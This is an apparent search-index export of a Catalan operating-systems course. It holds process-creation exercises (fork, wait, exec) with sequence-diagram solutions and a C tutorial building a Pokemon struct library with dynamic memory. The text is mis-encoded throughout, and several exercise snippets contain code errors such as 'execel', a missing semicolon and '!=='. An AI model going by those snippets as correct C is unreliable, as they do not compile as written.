    "text": "Quants processos es creen en executar el seg√ºent codi i quina √©s la seq√º√®ncia d‚Äôesdeveniments?\nfork();\nif (wait(st)&gt;0)\n    fork();\nexit();\nSoluci√≥:\nAquest codi crea 3 processos en total: el proc√©s pare i dos processos fills. La seq√º√®ncia d‚Äôesdeveniments √©s la seg√ºent:\n\n\n\n\n\n\n    sequenceDiagram\n        autonumber\n        participant P as Pare ¬∑ PID 100\n        participant F1 as Fill1 ¬∑ PID 101\n        participant F2 as Fill2 ¬∑ PID 102\n\n        P-&gt;&gt;F1: fork ‚Üí crea F1\n        P-&gt;&gt;P: wait bloquejat\n        F1-&gt;&gt;F1: wait retorna -1\n        F1-&gt;&gt;F1: exit \n        F1--&gt;&gt;P: desbloqueja wait del PID 100, retorna 101\n        P-&gt;&gt;F2: fork ‚Üí crea F2\n        P-&gt;&gt;P: exit\n        F2-&gt;&gt;F2: exit\n\n\n\n\n\n\n\n\n\n\n\n\nNota\n\n\n\nEl valors del PID s√≥n nom√©s exemples i poden variar en cada execuci√≥.\n\n\n\nQuantes vegades s‚Äôimprimir√† OS?\nint main(){\n    if(execel(\"bin/ls\",\"ls\",NULL) == -1){\n    perror(\"execl\");\n    }\n    printf(\"OS\\n\");\n    return 0;\n}\nQuantes vegades wait(st) retorna -1?\nid = fork();\nwait(st); //1\nif (id==0)\n    fork();\nwait(st); //2\nexit();\nSoluci√≥: En aquest cas, wait(st) retorna -1 3 vegades. La seq√º√®ncia d‚Äôesdeveniments √©s la seg√ºent:\n\n\n\n\n\n\n    sequenceDiagram\n        autonumber\n        participant P as Pare ¬∑ PID 100\n        participant F1 as Fill1 ¬∑ PID 101\n        participant N1 as Net1 ¬∑ PID 102\n\n        P-&gt;&gt;F1: fork ‚Üí crea F1\n        P-&gt;&gt;P: wait bloquejat //1\n        F1-&gt;&gt;F1: wait retorna -1 //1\n        F1-&gt;&gt;N1: fork ‚Üí crea N1\n        F1-&gt;&gt;F1: wait bloquejat //2\n        N1-&gt;&gt;N1: wait retorna -1 //2\n        N1-&gt;&gt;N1: exit\n        N1--&gt;&gt;F1: desbloqueja wait del PID 101, retorna 102\n        F1-&gt;&gt;F1: exit\n        F1--&gt;&gt;P: desbloqueja wait del PID 100, retorna 101\n        P--&gt;&gt;P: wait retorna -1 //2\n        P-&gt;&gt;P: exit\n\n\n\n\n\n\n\nQuantes vegades wait(st) retorna -1?\nid = fork();\nwait(st); //1\nif (id!=0)\n    fork();\nwait(st); //2\nexit();\nSoluci√≥: En aquest cas, wait(st) retorna -1 3 vegades. La seq√º√®ncia d‚Äôesdeveniments √©s la seg√ºent:\n\n\n\n\n\n\n    sequenceDiagram\n        autonumber\n        participant P as Pare ¬∑ PID 100\n        participant F1 as Fill1 ¬∑ PID 101\n        participant F2 as Fill2 ¬∑ PID 102\n\n        P-&gt;&gt;F1: fork ‚Üí crea F1\n        P-&gt;&gt;P: wait bloquejat //1\n        F1-&gt;&gt;F1: wait retorna -1 //1\n        F1-&gt;&gt;F1: wait retorna -1 //2\n        F1-&gt;&gt;F1: exit\n        F1--&gt;&gt;P: desbloqueja wait del PID 100, retorna 101\n        P-&gt;&gt;F2: fork ‚Üí crea F2\n        P-&gt;&gt;P: wait bloquejat //2\n        F2-&gt;&gt;F2: wait retorna -1 //2\n        F2-&gt;&gt;F2: exit\n        F2--&gt;&gt;P: desbloqueja wait del PID 100, retorna 102\n        P-&gt;&gt;P: exit\n\n\n\n\n\n\n\nAnalitza el seg√ºent codi i respon les preguntes:\nint main(void) {\n    int a = 1;\n    pid_t fork_ret = fork();\n    if (fork_ret &gt; 0) {\n        a++;\n        fprintf(stdout, \"Parent: int a is %d at %p\\n\", a, &a);\n        } else if (fork_ret == 0) { a++;}\n        fprintf(stdout, \"Child: int a is %d at %p\\n\", a, &a);\n    return 0;\n}\n\nQuin √©s el valor de a en el proc√©s pare i en el proc√©s fill?\nS‚Äôimprimir√† la mateixa adre√ßa de mem√≤ria per a a en el proc√©s pare i en el proc√©s fill?\nS‚Äôimprimir√† a la mateixa sortida est√†ndard (STDOUT) en el proc√©s pare i en el proc√©s fill?\n\nAnalitza el seg√ºent codi i justifica quin ser√† el resultat de la seva execuci√≥:\nint main(void) {\n    int* stuff = malloc(sizeof(int));\n    *stuff = 5;\n    pid_t fork_ret = fork();\n    printf(\"The last digit of pi is %d\\n\", *stuff);\n    if (fork_ret == 0)\n        *stuff = 6;\n    return 0;\n}\nQuina √©s la sortida del seg√ºent codi?\nint main()\n{\n    switch(fork()){\n        case 0: printf(\"A\");\n                switch(fork()){\n                    case 0: printf(\"B\");exit(0);\n                    default: switch(fork()){\n                        case 0: printf(\"C\");exit(0);\n                        default: wait(&st);wait(&st);exit(0);\n                    }            \n                wait(&st);\n                }\n        default: wait(&st); exit(0);\n    }\n}\nIndiqueu quin √©s el resultat de l‚Äôexecuci√≥ del seg√ºent codi. Nombre de processos creats, parantiu, informaci√≥ de stdout, proc√©s zombi, etc.\n#define N 10\nint main()\n{\n    int pid = getpid();\n    for (int x=0; x&lt;N x++)\n    {\n        switch(fork())\n        {\n            case 0:\n                if ( (pid%2) == 0 )\n                    printf(\"Pid Fill: %d\\n\", getpid());\n                    exit(0); //3\n                break;\n\n            default:\n                if ( (pid%2) !== 0 )\n                    exit(0); //2\n                break;\n        }\n    }\n    wait(NULL);\n    exit(0); //1\n}\nSoluci√≥:\nEl comportament del codi dep√®n de si el pid del proc√©s pare √©s parell o senar:\n\nCas parell:\n\n\n\n\n\n\n\n    sequenceDiagram\n    autonumber\n    participant P as Pare (PID parell)\n    participant F1 as Fill1\n    participant F2 as Fill2\n    participant Fx as ...\n    participant F10 as Fill10\n\n    P-&gt;&gt;F1: fork() crea Fill1\n    F1-&gt;&gt;F1: printf(\"Pid Fill: 101\") i exit() //3\n    P-&gt;&gt;F2: fork() crea Fill2\n    F2-&gt;&gt;F2: printf(\"Pid Fill: 102\") i exit() //3\n    P-&gt;&gt;Fx: fork() crea FillX\n    Fx-&gt;&gt;Fx: printf(\"Pid Fill: 10X\") i exit() //3\n    P-&gt;&gt;F10: fork() crea Fill10\n    F10-&gt;&gt;F10: printf(\"Pid Fill: 110\") i exit() //3\n    \n    P-&gt;&gt;P: wait()\n    Note over P,F10: Pare fa wait(NULL) al final i recull un fill\n    P-&gt;&gt;P: exit() //1\n\n\n\n\n\n\n\nEl proc√©s pare crea 10 fills, un a cada iteraci√≥ del bucle.\nEls fills acaben immediatament amb la crida a exit(0).\nEl pare, no fa cap wait() dins del bucle, per tant, els fills es converteixen en processos zombis temporals.\nEl pare √∫nicament fa un wait() al final del bucle, per tant, el proc√©s pare rebra la notificaci√≥ de la finalitzaci√≥ d‚Äôun fill i acabar√†.\nTots els processos fills -1 acaben en estat zombi.\nTots els processos orfes fins que init els recull.\nCas senar:\n\n\n\n\n\n\n    sequenceDiagram\n    autonumber\n    participant P as Pare (PID senar)\n    participant F as Fill\n    participant N as Net\n    participant P10 as Pare 10e\n    participant F10 as Fill 10e\n\n    P-&gt;&gt;F: fork() crea Fill\n    P-&gt;&gt;P: exit() //2\n    F-&gt;&gt;N: fork() crea Net\n    F-&gt;&gt;F: exit() //2\n\n    P10-&gt;&gt;F10: fork() crea Fill 10e\n    P10-&gt;&gt;P10: exit() //2\n    F10-&gt;&gt;F10: surt del bucle\n    F10-&gt;&gt;F10: wait() retorna -1\n    F10-&gt;&gt;F10: exit()\n\n\n\n\n\n\n\nEn aquest cas, el pare acaba despr√©s de crear el primer fill.\nCada iteraci√≥ del bucle, el nou pare (fill iteraci√≥ anterior) crea un fill i acaba.\nEs creen 10 generacions a partir del pare: P -&gt; F -&gt; N -&gt; BN ‚Ä¶\nCap pare fa cap wait(), per tant, tots els fills es converteixen en processos zombis.\nL‚Äô√∫ltim fill executar√† el wait() i com no t√© fills, retornar√† -1 i acabar√†.\nTots els processos fills acaben en estat zombi temporal.\nTots els processos fills esdevenen orfes fins que init els recull.",
    "crumbs": [
      "Activitats",
      "Unitat 03",
      "Exercici ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html",
    "href": "activities/unit00/02-ex01-c.html",
    "title": "Exercicis amb C - Pokemon",
    "section": "",
    "text": "Aprendre a utilitzar estructures de dades en C.\nPracticar la manipulaci√≥ de cadenes en C.\nDesenvolupar habilitats en la creaci√≥ de programes en C que utilitzin estructures de dades.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon¬∑"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#objectius",
    "href": "activities/unit00/02-ex01-c.html#objectius",
    "title": "Exercicis amb C - Pokemon",
    "section": "",
    "text": "Aprendre a utilitzar estructures de dades en C.\nPracticar la manipulaci√≥ de cadenes en C.\nDesenvolupar habilitats en la creaci√≥ de programes en C que utilitzin estructures de dades.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon¬∑"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#estructures-de-dades-en-c",
    "href": "activities/unit00/02-ex01-c.html#estructures-de-dades-en-c",
    "title": "Exercicis amb C - Pokemon",
    "section": "Estructures de dades en C",
    "text": "Estructures de dades en C\nUn pokemon el podem entendre com una estructura de dades que cont√© diferents camps. En aquest cas, els camps que ens interessen s√≥n:\n\npokemon_id: identificador √∫nic del pokemon\nname: nom del pokemon\nheight: altura del pokemon\nweight: pes del pokemon\n\nPer poder implementar aquesta estructura de dades en C, necessitem definir un tipus de dades que ens permeti agrupar aquests camps. Aix√≤ ho podem fer mitjan√ßant la paraula reservada struct.\nstruct pokemon {\n    int          pokemon_id;\n    char         name[50];\n    double       height;\n    double       weight;\n};\nPodem fer un programa molt senzill per crear un pokemon i mostrar-lo per pantalla.\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strcpy\n\nstruct pokemon {\n    int          pokemon_id;\n    char         name[50];\n    double       height;\n    double       weight;\n};\n\nint main() {\n    struct pokemon pikachu;\n    pikachu.pokemon_id = 25;\n    strcpy(pikachu.name, \"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    return 0;\n}\nSi compilem i executem el programa, funcionar√† i obtindrem el resultat esperat:\ngcc -o pokemon main.c\n./pokemon \n    Pokemon: Pikachu\n    Pokemon ID: 25\n    Pokemon Height: 0.400000\n    Pokemon Weight: 6.000000\nEn aquesta primera versi√≥ hem utilitzat una mida est√†tica pel camp name utilizant la stack. Aix√≤ vol dir que el nom del pokemon no pot ser m√©s gran de 50 car√†cters. Tamb√©, indica que estem desaprofitant mem√≤ria en tots els noms de pokemons inferiors a 50 car√†cters. Recordeu que la m√®moria √©s un recurs molt valu√≥s i que hem d‚Äôaprofitar al m√†xim.\nPer tant, per poder solucionar aquest problema, podem utilitzar la heap per reservar mem√≤ria din√†micament per al camp name. Aix√≤ ens permetr√† utilitzar la mem√≤ria de forma m√©s eficient i no tindrem cap limitaci√≥ en la mida del nom del pokemon. D‚Äôaquesta manera podem garantir que cada nom ocupi l‚Äôespai que requereixi.\nstruct pokemon {\n    int          pokemon_id;\n    char         *name;\n    double       height;\n    double       weight;\n};\nPer tant el nostre programa quedaria de la seg√ºent manera, on podem veure com reservem mem√≤ria per al camp name mitjan√ßant la funci√≥ malloc i alliberem la mem√≤ria reservada mitjan√ßant la funci√≥ free:\n/*  \n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strcpy()\n\nstruct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n};\n\nint main() {\n    struct pokemon pikachu;\n    pikachu.pokemon_id = 25;\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    pikachu.name = malloc(8 * sizeof(char));\n    strcpy(pikachu.name, \"Pikachu\");\n    \n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\n\n\n\n\n\n\nConsellObservaci√≥\n\n\n\nQuan reserveu mem√≤ria per una cadena de car√†cters recordeu de reservar 1 byte m√©s per el car√†cter de final de cadena ‚Äò\\0‚Äô.\n\n\npikachu.name = malloc( (strlen(\"Pikachu\")+1) * sizeof(char) );\nAra anem analitzar els seg√ºents sup√≤sits:\nchar name[] = \"Pikachu\";\npikachu.name = name;\npikachu.name = &name;\npikachu.name = strdup(name);\nstrcpy(pikachu.name, name);\nUs deixo les signatures de les funcions que es troben a la llibreria string.h:\nchar *strdup(const char *s);\nchar *strcpy(char *dest, const char *src);\n\npikachu.name = name;: Aquesta assignaci√≥ √©s v√†lida ja que name √©s un array de car√†cters i, en aquest context, es comporta com un punter al seu primer element (√©s equivalent a &name[0]), que √©s el que espera pikachu.name. Per√≤ si modifiquem la variable name en un altre punt del programa, pikachu.name tamb√© canviar√†, ja que apunta a la mateixa mem√≤ria.\n\nchar name[] = \"Pikachu\";\npikachu.name = name;\nprintf(\"Pokemon: %s\\n\", pikachu.name); // Pikachu\nstrcpy(name,\"Raichu\");\nprintf(\"Pokemon: %s\\n\", pikachu.name); // Raichu\n\npikachu.name = &name;: &name √©s l‚Äôadre√ßa de l‚Äôarray name, i pikachu.name √©s un punter a char, aix√≠ que aquesta assignaci√≥ no √©s v√†lida, ja que l‚Äôadre√ßa de name no √©s compatible amb un punter a char.\npikachu.name = strdup(name);: Aquesta assignaci√≥ √©s v√†lida ja que strdup retorna un punter a char, i aix√≤ √©s el que espera pikachu.name. A m√©s, com que strdup reserva mem√≤ria nova per a la cadena, no hi ha cap problema si modifiquem la variable name en un altre punt del programa. Es pot fer servir sense reserva pr√®via de mem√≤ria per a pikachu.name, ja que strdup reserva mem√≤ria nova per a la cadena i retorna un punter a aquesta mem√≤ria.\nstrcpy(pikachu.name, name);: Aix√≤ √©s v√†lid si pikachu.name ja t√© mem√≤ria reservada pr√®viament (per exemple, a trav√©s de malloc o calloc) en la qual es pot realitzar la c√≤pia.\n\n\n\n\n\n\n\nConsellObservaci√≥\n\n\n\nMalloc i Calloc ens permeten reservar mem√≤ria din√†micament. La difer√®ncia entre malloc i calloc √©s que malloc no inicialitza la mem√≤ria reservada, mentre que calloc inicialitza la mem√≤ria reservada a 0.\n\n\nCom a resum podem dir que:\nPokemon *pikachu = create_pokemon();\nset_name(pikachu, \"Pikachu\");\nset_pokemon_id(pikachu, 25);\nset_height(pikachu, 0.4);\nset_weight(pikachu, 6.0);\nEn m√®moria es veuria aix√≠:\n\nTot la estructura de dades pikachu es troba a la heap tant el id, height, weight i el punter name. El punter pikachu es troba a la stack. En canvi, el punter Pokemon pikachu es troba a la stack i apunta a l‚Äôestructura de dades Pokemon que es troba a la heap.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon¬∑"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#√∫s-de-typedef",
    "href": "activities/unit00/02-ex01-c.html#√∫s-de-typedef",
    "title": "Exercicis amb C - Pokemon",
    "section": "√ös de typedef",
    "text": "√ös de typedef\nAra podem utilitzar typedef per definir un nou tipus de dades que ens permeti crear pokemons de forma m√©s senzilla.\n/*\n * main.c\n*/\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strdup(),\n\ntypedef struct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n} Pokemon;\n\nint main() {\n    Pokemon pikachu;\n    pikachu.pokemon_id = 25;\n\n    pikachu.name = strdup(\"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\n\n\n\n\n\n\nConsellObservaci√≥\n\n\n\nLa funci√≥ strdup per definici√≥ fa exactament el mateix que fer servir malloc i strcpy, per√≤ en una sola l√≠nia de codi, per tant s‚Äôha de desasignar la mem√≤ria reservada amb free.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon¬∑"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#creaci√≥-i-√∫s-de-llibreries",
    "href": "activities/unit00/02-ex01-c.html#creaci√≥-i-√∫s-de-llibreries",
    "title": "Exercicis amb C - Pokemon",
    "section": "Creaci√≥ i √∫s de llibreries",
    "text": "Creaci√≥ i √∫s de llibreries\nPer poder reutilitzar el codi que hem creat fins ara, podem crear una llibreria que ens permeti fer operacions amb pokemons. Per exemple, podem moure la definici√≥ de la nostra estructura de dades Pokemon a un fitxer anomenat pokemon.h i la implementaci√≥ de les funcions a un fitxer anomenat pokemon.c.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n} Pokemon;\n\n#endif // _POKEMON_H_\nEn el fitxer pokemon.c implementarem les funcions que hem definit a la interf√≠cie de la nostra llibreria.\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strlen(), strcpy()\n#include \"pokemon.h\"\nAra podem utilitzar la nostra llibreria:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon pikachu;\n    pikachu.pokemon_id = 25;\n\n    pikachu.name = strdup(\"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\nSi compilem i executem:\ngcc pokemon.c main.c -o pokemon\n./pokemon \nObtindrem el seg√ºent resultat, on semblaria que tot funciona correctament:\nPokemon: Pikachu\nPokemon ID: 25\nPokemon Height: 0.400000\nPokemon Weight: 6.000000\nQu√® implica moure la definici√≥ de la nostra estructura de dades al fitxer d‚Äôimplementaci√≥?\nSi movem la definici√≥ de la nostra estructura de dades al fitxer d‚Äôimplementaci√≥, el compilador no podr√† veure la definici√≥ de la nostra estructura de dades quan compili el nostre programa principal. Per fer-ho necessitem definir el tipus de dades Pokemon al fitxer pokemon.h i la definici√≥ dels atributs de la nostra estructura de dades al fitxer pokemon.c.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon Pokemon;\n\n#endif // _POKEMON_H_\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strlen(), strcpy()\n#include \"pokemon.h\"\n\nstruct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n};\nAra en el nostre fitxer main.c podem utilitzar la nostra llibreria de la seg√ºent manera:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon pikachu;\n    pikachu.pokemon_id = 25;\n\n    pikachu.name = strdup(\"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\nEn aquest punt els atributs de la nostra estructura de dades s√≥n privats i no poden ser modificats des de l‚Äôexterior. Per tant, necessitem definir getters i setters per poder accedir i modificar els atributs de la nostra estructura de dades.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon Pokemon;\n\nint get_pokemon_id(Pokemon *pokemon);\nvoid set_pokemon_id(Pokemon *pokemon, int pokemon_id);\n\nchar * get_name(Pokemon *pokemon);\nvoid set_name(Pokemon *pokemon, char *name);\n\ndouble get_height(Pokemon *pokemon);\nvoid set_height(Pokemon *pokemon, double height);\n\ndouble get_weight(Pokemon *pokemon);\nvoid set_weight(Pokemon *pokemon, double weight);\n\n#endif // _POKEMON_H_\nObserveu que els setter reben un punter a la nostra estructura de dades Pokemon. Aix√≤ √©s perqu√® volem modificar l‚Äôestructura de dades original i no una c√≤pia de l‚Äôestructura de dades. En el cas dels getter no necessitem modificar l‚Äôestructura de dades original, per tant, no necessitem passar un punter per√≤ per evitar c√≤pies innecess√†ries de l‚Äôestructura de dades, passem un punter.\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nstruct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n};\n\nint get_pokemon_id(Pokemon *pokemon) {\n    return pokemon-&gt;pokemon_id;\n}\n\nvoid set_pokemon_id(Pokemon *pokemon, int pokemon_id) {\n    pokemon-&gt;pokemon_id = pokemon_id;\n}\n\nchar * get_name(Pokemon *pokemon) {\n    return pokemon-&gt;name;\n}\n\nvoid set_name(Pokemon *pokemon, char *name) {\n    strcpy(pokemon-&gt;name, name);\n}\n\ndouble get_height(Pokemon *pokemon) {\n    return pokemon-&gt;height;\n}\n\nvoid set_height(Pokemon *pokemon, double height) {\n    pokemon-&gt;height = height;\n}\n\ndouble get_weight(Pokemon *pokemon) {\n    return pokemon-&gt;weight;\n}\n\nvoid set_weight(Pokemon *pokemon, double weight) {\n    pokemon-&gt;weight = weight;\n}\n\n\n\n\n\n\nImportantObservaci√≥\n\n\n\nLa funci√≥ strcpy utilitzada en el setter de name no √©s segura. Pot causar buffer overflow si la nova cadena √©s m√©s gran que la mem√≤ria actual. Una manera de solucionar aquest problema seria utiltizar strncpy en lloc de strcpy, per√≤ strncpy no afegeix el car√†cter de finalitzaci√≥ de cadena ‚Äò\\0‚Äô si la nova cadena √©s m√©s gran que la mida especificada. Per tant, √©s important assegurar-se que la cadena de dest√≠ t√© prou espai per emmagatzemar la nova cadena i el car√†cter de finalitzaci√≥.\n\n\nAra podem utilitzar els getter i setter de la seg√ºent manera:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon pikachu;\n    set_pokemon_id(&pikachu, 25);\n    set_name(&pikachu, \"Pikachu\");\n    set_height(&pikachu, 0.4);\n    set_weight(&pikachu, 6.0);\n\n    printf(\"Pokemon: %s\\n\", get_name(&pikachu));\n    printf(\"Pokemon ID: %d\\n\", get_pokemon_id(&pikachu));\n    printf(\"Pokemon Height: %f\\n\", get_height(&pikachu));\n    printf(\"Pokemon Weight: %f\\n\", get_weight(&pikachu));\n\n    return 0;\n}\nEl problema ara resideix en Pokemon pikachu; ja que no podem crear una inst√†ncia de la nostra estructura de dades Pokemon ja que la definici√≥ de la nostra estructura de dades √©s privada. Si executeu el programa, obtindreu un error de compilaci√≥ similar a aquest: error: storage size of ‚Äòpikachu‚Äô isn‚Äôt known. Per tant, necessitem crear una funci√≥ que ens permeti reservar mem√≤ria per a la nostra estructura de dades i retornar un punter a la nostra estructura de dades.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon Pokemon;\n\nPokemon * create_pokemon();\nvoid destroy_pokemon(Pokemon *pokemon);\n\n...\n\n#endif // _POKEMON_H_\n\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strlen(), strcpy()\n#include \"pokemon.h\"\n\nint BUFFER_SIZE = 10;\n\nPokemon * create_pokemon() {\n    Pokemon *pokemon = malloc(sizeof(Pokemon));\n    pokemon-&gt;name = malloc(BUFFER_SIZE * sizeof(char));\n    return pokemon;\n}\n\nvoid destroy_pokemon(Pokemon *pokemon) {\n    free(pokemon-&gt;name);\n    free(pokemon);\n}\n\n...\nAra podem utilitzar la nostra llibreria de la seg√ºent manera:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon *pikachu = create_pokemon();\n    set_pokemon_id(pikachu, 25);\n    set_name(pikachu, \"Pikachu\");\n    set_height(pikachu, 0.4);\n    set_weight(pikachu, 6.0);\n\n    printf(\"Pokemon: %s\\n\", get_name(pikachu));\n    printf(\"Pokemon ID: %d\\n\", get_pokemon_id(pikachu));\n    printf(\"Pokemon Height: %f\\n\", get_height(pikachu));\n    printf(\"Pokemon Weight: %f\\n\", get_weight(pikachu));\n\n    destroy_pokemon(pikachu);\n\n    return 0;\n}\nUna millora necess√†ria seria redimensionar el camp name de la nostra estructura de dades Pokemon quan la mida de la cadena sigui m√©s gran o m√©s petita que la mida del buffer. Per fer-ho, podem utilitzar la funci√≥ realloc.\n/*\n * pokemon.c\n */\n\nvoid set_name(Pokemon *pokemon, char *name) {\n    if (strlen(name) != strlen(pokemon-&gt;name)) {\n        pokemon-&gt;name = realloc(pokemon-&gt;name, (strlen(name) + 1) * sizeof(char));\n    }\n    strcpy(pokemon-&gt;name, name);\n}\n\n\n\n\n\n\nImportantObservaci√≥\n\n\n\nLa funci√≥ strlen(pokemon-&gt;name) nom√©s √©s fiable si pokemon-&gt;name ja cont√© una cadena v√†lida (‚Äò\\0‚Äô). Just despr√©s de create_pokemon(), pokemon-&gt;name pot estar buida (tot i que inicialitzes amb malloc de 10 bytes, podria no tenir ‚Äò\\0‚Äô). Millor comparar amb la mida del buffer o fer sempre realloc(strlen(name)+1).\n\n\nPer comprovar que la funci√≥ realloc funciona correctament, podem fer el seg√ºent:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon *p = create_pokemon();\n    set_name(p, \"Pikachu\");\n\n    printf(\"Pokemon: %s\\n\", get_name(p));\n    printf(\"Pokemon name size: %ld\\n\", strlen(get_name(p)));\n\n    set_name(p, \"Raichu\");\n\n    printf(\"Pokemon: %s\\n\", get_name(p));\n    printf(\"Pokemon name size: %ld\\n\", strlen(get_name(p)));\n\n    set_name(p, \"Charizard\");\n\n    printf(\"Pokemon: %s\\n\", get_name(p));\n    printf(\"Pokemon name size: %ld\\n\", strlen(get_name(p)));\n\n    destroy_pokemon(p);\n\n    return 0;\n}\nImagineu que ara voleu guardar una llista o vector de pokemons. Com ho far√≠eu? Una manera seria crear un vector de punters a la nostra estructura de dades Pokemon.\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon *pokemons[3];\n\n    pokemons[0] = create_pokemon();\n    set_name(pokemons[0], \"Pikachu\");\n\n    pokemons[1] = create_pokemon();\n    set_name(pokemons[1], \"Raichu\");\n\n    pokemons[2] = create_pokemon();\n    set_name(pokemons[2], \"Charizard\");\n\n    for (int i = 0; i &lt; 3; i++) {\n        printf(\"Pokemon: %s\\n\", get_name(pokemons[i]));\n    }\n\n    for (int i = 0; i &lt; 3; i++) {\n        destroy_pokemon(pokemons[i]);\n    }\n\n    return 0;\n}\nPodem complicar una mica m√©s el disseny. Ara imagineu que voleu crear una llista din√†mica de pokemons. On un usuari us pot demanar quants pokemon vol introduir i despr√©s introduir les dades dels pokemons en temps d‚Äôexecuci√≥. Com ho far√≠eu?\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    int n;\n    printf(\"Quants pokemons vols introduir? \");\n    scanf(\"%d\", &n);\n\n    Pokemon **pokemons = malloc(n * sizeof(Pokemon *));\n    int id;\n    char* name = malloc(100 * sizeof(char));\n    double height, weight;\n\n\n\n    for (int i = 0; i &lt; n; i++) {\n        pokemons[i] = create_pokemon();\n\n        printf(\"Introdueix les seves dades en format: id nom altura pes\\n\");\n        scanf(\"%d %s %lf %lf\", &id, name, &height, &weight);\n\n        set_pokemon_id(pokemons[i], id);\n        set_name(pokemons[i], name);\n        set_height(pokemons[i], height);\n        set_weight(pokemons[i], weight);\n        \n    }\n\n    free(name);\n\n    for (int i = 0; i &lt; n; i++) {\n        printf(\"Pokemon Name: %s\\n\", get_name(pokemons[i]));\n        printf(\"Pokemon ID: %d\\n\", get_pokemon_id(pokemons[i]));\n        printf(\"Pokemon Height: %f\\n\", get_height(pokemons[i]));\n        printf(\"Pokemon Weight: %f\\n\", get_weight(pokemons[i]));\n        printf(\"\\n\");\n    }\n\n    for (int i = 0; i &lt; n; i++) {\n        destroy_pokemon(pokemons[i]);\n    }\n\n    free(pokemons);\n\n    return 0;\n}\n\n\n\n\n\n\nImportantObservaci√≥\n\n\n\nDespr√©s de tots els 